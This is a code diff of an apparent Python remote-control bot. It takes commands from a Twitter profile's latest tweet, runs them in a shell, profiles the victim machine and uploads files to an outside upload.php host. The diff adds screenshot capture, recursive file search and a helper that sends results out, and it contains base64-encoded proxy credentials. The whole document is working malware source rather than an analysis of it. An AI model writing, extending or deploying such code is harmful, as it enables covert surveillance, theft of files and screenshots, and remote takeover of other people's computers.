@@ -1,4 +1,6 @@
-import base64
+import tempfile
+from base64 import b64decode
+from PIL import ImageGrab
 import platform
 from getpass import getuser
 from locale import getdefaultlocale
@@ -13,20 +15,22 @@ from bs4 import BeautifulSoup
 from uuid import getnode as get_mac
 import json
 
-twitterUrl = "http://twitter.com/thekiranbedi"
-uploadURL = 'https://<your paid or free hosting site address >/upload.php'
+
+twitterUrl = "https://twitter.com/Animesh77277278"
+uploadURL = 'https://monohydric-variatio.000webhostapp.com/upload.php'
 tweetNumberFromTopRecent = 0  # the topmost tweet
 identification = {}
 botname = ''
+proxyDict = {'http': "http://username:pasword@proxyserver:proxyport"}
+proxy = {'http': "http://" + b64decode("cml0MjAxNTA0NA==") + ":" + b64decode("SWlpdGEwNDQ=") + "@172.31.1.6:8080"}
 
 
-def commandFromTwitter(twitterUrl):
-    response = requests.get(url=twitterUrl, proxies={
-        'http': "http://" + base64.b64decode("cml0MjAxNTA0NA==") + ":" + base64.b64decode(
-            "SWlpdGEwNDQ=") + "@172.31.1.6:8080"})
+def commandFromTwitter():
+    response = sendGet(twitterUrl)
     soup = BeautifulSoup(response.text, 'html.parser')
     # For parsing the first tweet
     command = soup.find_all("p", {"class": "js-tweet-text"})[tweetNumberFromTopRecent].contents[0]
+    print command
     return command
 
 
@@ -49,20 +53,17 @@ def persistence():
 
 
 def sendGet(Url):
-    token = "cml0MjAxNTA0NA==SWlpdGEwNDQ="
-    u, p = token.split('==')
-    u += "=="
-    response = requests.get(url=Url, proxies={
-        'http': "http://" + base64.b64decode(u) + ":" + base64.b64decode(p) + "@172.31.1.6:8080"})
+    response = requests.get(url=Url, proxies=proxy)
     return response
 
 
 def sendPost(Url, data, files=None):
-    token = "cml0MjAxNTA0NA==SWlpdGEwNDQ="
-    u, p = token.split('==')
-    u += "=="
-    response = requests.post(url=Url, data=data, proxies={
-        'http': "http://" + base64.b64decode(u) + ":" + base64.b64decode(p) + "@172.31.1.6:8080"})
+    response = requests.post(url=Url, data=data, proxies=proxy)
+    return response
+
+
+def sendFile(files=None):
+    response = requests.post(uploadURL, data={'botname': botname}, files=files)
     return response
 
 
@@ -75,7 +76,7 @@ def getSysDetails():
     if len(IP) > 1:
         publicIP = IP[len(IP) - 1]  # last ip is the public ip
     else:
-        publicIP = IP[1]  # last ip is the public ip
+        publicIP = IP[0]  # last ip is the public ip
     addr = get_mac()  # To uniquely identify the PC
     h = iter(hex(addr)[2:].zfill(12))
     macAddr = "_".join(
@@ -91,6 +92,30 @@ def getSysDetails():
     return json.dumps(iD)
 
 
+def screenshot():
+    dirpath = tempfile.mktemp()
+    ImageGrab.grab().save(dirpath+"\img.jpg", "JPEG")
+    files = {'file': open(dirpath+"\img.jpg", 'rb')}
+    r = sendFile(files)
+    files['file'].close()
+    shutil.rmtree(dirpath)
+
+
+def search(command):
+    # received command as "search C:\\*.pdf
+    command = command[7:]
+    path, ext = command.split('*')
+
+    listOfFiles = ''
+
+    for dirpath, dirname, files in os.walk(path):
+        for file in files:
+            if file.endswith(ext):
+                listOfFiles = listOfFiles + '\n' + os.path.join(dirpath, file)
+
+    res = sendPost(uploadURL, data=listOfFiles)
+
+
 def initialize():
     persistence()
     global identification
@@ -100,15 +125,11 @@ def initialize():
     dictID = json.loads(identification)
     global botname
     botname = dictID['locale'] + "_" + dictID['username'] + "_" + dictID['macAddr']
-    print botname
-
-
-initialize()
 
 
 def connect():
     while True:
-        command = commandFromTwitter(twitterUrl)
+        command = commandFromTwitter()
         print command
 
         if 'terminate' in command:
@@ -118,9 +139,12 @@ def connect():
             grab, path = command.split('*')
             if os.path.exists(path):
                 files = {'file': open(path, 'rb')}
-                r = sendPost(uploadURL, data={'botname': botname}, files=files)
+                r = sendFile(files)
             else:
                 r = sendPost(uploadURL, data='[-]File Not Found')
+
+        elif 'screencap' in command:
+            screenshot()
 
         else:
             CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
@@ -129,6 +153,9 @@ def connect():
             post_response = sendPost(url, CMD.stderr.read())
 
         time.sleep(3)
+
+
+initialize()
 
 
 while True:
